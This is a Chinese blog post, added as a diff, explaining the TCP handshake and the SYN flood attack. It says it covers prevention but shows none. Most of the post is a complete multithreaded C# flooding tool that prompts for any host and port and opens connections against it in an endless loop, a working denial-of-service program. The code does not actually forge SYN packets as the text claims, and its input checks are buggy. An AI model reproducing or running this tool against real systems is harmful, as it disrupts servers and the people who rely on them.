@@ -1,0 +1,212 @@
+---
+author: TheC
+comments: true
+date: 2012-01-10 12:29:29+00:00
+layout: post
+slug: synflood
+title: SynFlood的原理与防范
+wordpress_id: 206
+categories:
+- ACFUN
+---
+
+SYN Flood是当前最流行的针对服务器的方式之一，它是利用TCP协议缺陷，发送大量伪造的TCP连接请求，从而使得被攻击方资源耗尽的攻击方式，最终导致服务器无法提供正常的服务。
+
+TCP与UDP不同，TCP是基于连接的协议，为了在服务端和客户端之间传送TCP数据，必须先建立一个虚拟连接，也就是TCP连接。也就是我们经常听说的TCP协议中的三次握手（Three-way Handshake），建立TCP连接的标准过程如下：
+
+第一次握手：建立连接时，客户端发送syn包(syn=j)到服务器，并进入SYN_SEND状态，等待服务器确认；
+第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；
+第三次握手：客户端收到服务器的SYN＋ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端 和服务器进入ESTABLISHED状态，完成三次握手。
+<!-- more -->
+但是在实际中，我们并不能保证每次握手都成功，服务器也不能立即处理掉来握手的每一个用户。于是在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的SYN包（syn=j）开设一个条目，该条目表明服务器已收到SYN包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于Syn_RECV状态，当服务器收到客户的确认包时，删除该条目，服务器进入 ESTABLISHED状态。
+你也许会问，假如我在握手过程中，网络条件变坏突然丢包怎么办？服务器发送完SYN－ACK包，如果未收到客户确认包，服务器进行首次重传，等待一段时间仍未收到客户确认包，进行第二次重传，如果重传次数超过系统规定的最大重传次数，系统将该连接信息从半连接队列中删除。
+OK问题出来了。第二次握手结束，第三次握手是客户端发起的，什么时候向服务器确认，客户端定的，假如客户端不向服务器发送ACK包，那么服务器将一直等待(SYN_RECV)，一般来说这个时间是30秒左右一个用户出现异常导致服务器的一个线程等待半分钟并不会对服务器端造成什么大的影响，但如果有大量的等待丢失的情况发生，服务器端将为了维护一个非常大的半连接请求而消耗非常多的资源。大量的数据保存并遍历也会消耗非常多的CPU时间和内存，再加上服务器端不断对列表中的IP进行SYN+ACK的重试，服务器的负载将会变得非常巨大。如果服务器的TCP/IP栈不够强大，最后的结果往往是 堆栈溢出崩溃。相对于攻击数据流，正常的用户请求就显得十分渺小，服务器疲于处理攻击者伪造的TCP连接请求而无暇理睬客户的正常请求，此时从正常客户会表现为打开页面缓慢或服务器无响应，这种情况就是我们常说的服务器端SYN Flood攻击。
+
+下面一段C#程序演示了如何进行Syn攻击：
+[csharp]
+namespace acfun.Lurnar.TestAPP
+{
+    using System;
+    using System.Net;
+    using System.Net.Sockets;
+    using System.Threading;
+
+    internal class SynFlood
+    {
+        private static ThreadStart[] FloodingJob;
+        private static Thread[] FloodingThread;
+        public static string Host;
+        private static IPEndPoint ipEo;
+        public static int Port = 80;
+        private static SendSyn[] SynClass;
+        public static int SynSockets = 80;
+        public static int Threads = 50;
+
+        private static int string2int(string str)
+        {
+            int result = -1;
+            if (int.TryParse(str, out result)) return result;
+            else return -1;
+
+        }
+        public static void Main()
+        {
+            Console.WriteLine("端口？");
+            string temp = null;
+            while (temp == null)
+            {
+                temp = Console.ReadLine();
+                if (temp != null)
+                {
+                    Port = string2int(temp);
+                    if (Port == -1)
+                    {
+                        Port = 80;
+                        temp = null;
+                    }
+                }
+            }
+            temp = null;
+            Console.WriteLine("Syn端口？");
+            while (temp == null)
+            {
+                temp = Console.ReadLine();
+                if (temp != null)
+                {
+                    SynSockets = string2int(temp);
+                    if (Port == -1)
+                    {
+                        SynSockets = 80;
+                        temp = null;
+                    }
+                }
+            }
+            temp = null;
+            Console.WriteLine("线程数？");
+            while (temp == null)
+            {
+                temp = Console.ReadLine();
+                if (temp != null)
+                {
+                    Threads = string2int(temp);
+                    if (Port == -1)
+                    {
+                        Threads = 200;
+                        temp = null;
+                    }
+                }
+            }
+            Console.WriteLine("域名或IP地址？");
+            while (Host == null)
+            {
+                Host = Console.ReadLine();
+                try
+                {
+                    ipEo = new IPEndPoint(Dns.GetHostEntry(Host).AddressList[0], Port);
+                }
+                catch
+                {
+                    try
+                    {
+                        ipEo = new IPEndPoint(IPAddress.Parse(Host), Port);
+                    }
+                    catch
+                    {
+                        Host = null;
+                    }
+                }
+            }
+            FloodingThread = new Thread[Threads];
+            FloodingJob = new ThreadStart[Threads];
+            SynClass = new SendSyn[Threads];
+            for (int i = 0; i < Threads; i++)
+            {
+                SynClass[i] = new SendSyn(ipEo, SynSockets);
+                FloodingJob[i] = new ThreadStart(SynClass[i].Send);
+                FloodingThread[i] = new Thread(FloodingJob[i]);
+                Console.WriteLine("初始化线程[" + i.ToString() + "]" );
+                FloodingThread[i].Start();
+            }
+        }
+
+        public static void StopSynFlood()
+        {
+            for (int i = 0; i < Threads; i++)
+            {
+                try
+                {
+                    FloodingThread[i].Abort();
+                }
+                catch
+                {
+                }
+            }
+        }
+
+        private class SendSyn
+        {
+            private IPEndPoint ipEo;
+            private Socket[] Sock;
+            private int SynSockets;
+
+            public SendSyn(IPEndPoint ipEo, int SynSockets)
+            {
+                this.ipEo = ipEo;
+                this.SynSockets = SynSockets;
+            }
+
+            public void OnConnect(IAsyncResult ar)
+            {
+            }
+
+            public void Send()
+            {
+                int num;
+            Label_0001: ;
+                try
+                {
+                    this.Sock = new Socket[this.SynSockets];
+                    for (num = 0; num < this.SynSockets; num++)
+                    {
+                        this.Sock[num] = new Socket(this.ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+                        this.Sock[num].Blocking = false;
+                        AsyncCallback callback = new AsyncCallback(this.OnConnect);
+                        this.Sock[num].BeginConnect(this.ipEo, callback, this.Sock[num]);
+                    }
+                    Thread.Sleep(100);
+                    for (num = 0; num < this.SynSockets; num++)
+                    {
+                        if (this.Sock[num].Connected)
+                        {
+                            this.Sock[num].Disconnect(false);
+                        }
+                        this.Sock[num].Close();
+                        this.Sock[num] = null;
+                    }
+                    this.Sock = null;
+                    goto Label_0001;
+                }
+                catch
+                {
+                    for (num = 0; num < this.SynSockets; num++)
+                    {
+                        try
+                        {
+                            if (this.Sock[num].Connected)
+                            {
+                                this.Sock[num].Disconnect(false);
+                            }
+                            this.Sock[num].Close();
+                            this.Sock[num] = null;
+                        }
+                        catch
+                        {
+                        }
+                    }
+                    goto Label_0001;
+                }
+            }
+        }
+    }
+}
+[/csharp]
